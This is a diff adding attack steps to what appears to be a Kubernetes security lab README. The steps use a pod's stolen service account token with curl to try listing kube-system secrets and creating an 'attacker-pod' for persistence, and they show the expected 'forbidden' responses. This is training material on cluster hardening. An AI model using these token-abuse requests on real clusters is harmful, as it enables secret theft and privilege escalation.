@@ -253,6 +253,77 @@ ls: cannot access '/var/run/secrets/kubernetes.io/serviceaccount/': No such file
 
 The token directory does not exist. The pod has no Kubernetes API credentials to steal.
 
+## Exploiting the Token
+
+The previous steps demonstrated extracting and inspecting a service account token. The following steps show what an attacker does next — probing the API for privilege escalation opportunities. Run these from inside the `ubuntu` pod deployed with `ubuntu.yaml` (re-deploy it if you cleaned it up).
+
+### Step 9 — Attempt to list secrets across namespaces
+
+With the token loaded from Step 6, probe for secrets cluster-wide:
+
+```bash
+APISERVER=https://kubernetes.default.svc.cluster.local
+CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# Try listing secrets in kube-system (likely denied for this limited SA)
+curl -s --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/namespaces/kube-system/secrets | jq '.message'
+```
+
+Expected output (the limited SA lacks `list secrets` permission):
+
+```
+"secrets is forbidden: User \"system:serviceaccount:default:ubuntu-sa\" cannot list resource \"secrets\" ..."
+```
+
+### Step 10 — Attempt to create a pod via the API
+
+An attacker tries to spawn a new pod to escalate privileges or establish persistence:
+
+```bash
+curl -s --cacert $CACERT \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -X POST \
+  -d '{
+    "apiVersion": "v1",
+    "kind": "Pod",
+    "metadata": {"name": "attacker-pod", "namespace": "default"},
+    "spec": {
+      "containers": [{"name": "shell", "image": "alpine", "command": ["sleep","3600"]}]
+    }
+  }' \
+  $APISERVER/api/v1/namespaces/default/pods | jq '{status: .status, message: .message}'
+```
+
+Expected output (denied — the SA only has `get`/`list` on `namespaces`):
+
+```json
+{
+  "status": "Failure",
+  "message": "pods is forbidden: User \"system:serviceaccount:default:ubuntu-sa\" cannot create resource \"pods\" ..."
+}
+```
+
+### Step 11 — Compare: what a cluster-admin token can do
+
+From outside the pod, generate a token with elevated privileges to see the contrast:
+
+```bash
+# Exit the pod first
+exit
+
+# Use kubectl (which has cluster-admin) to show what a privileged SA can do
+kubectl auth can-i --list --as=system:serviceaccount:default:ubuntu-sa | head -10
+echo "---"
+kubectl auth can-i create pods --as=system:serviceaccount:default:ubuntu-sa
+kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:default:ubuntu-sa
+```
+
+The limited SA returns `no` for both `create pods` and `list secrets`. If an attacker finds a service account bound to `cluster-admin` (e.g., from the Kubernetes Dashboard — see [Exposed Sensitive Interfaces](../exposed-sensitive-interfaces/README.md)), all of the above requests succeed.
+
 ## Cleanup
 
 ```bash
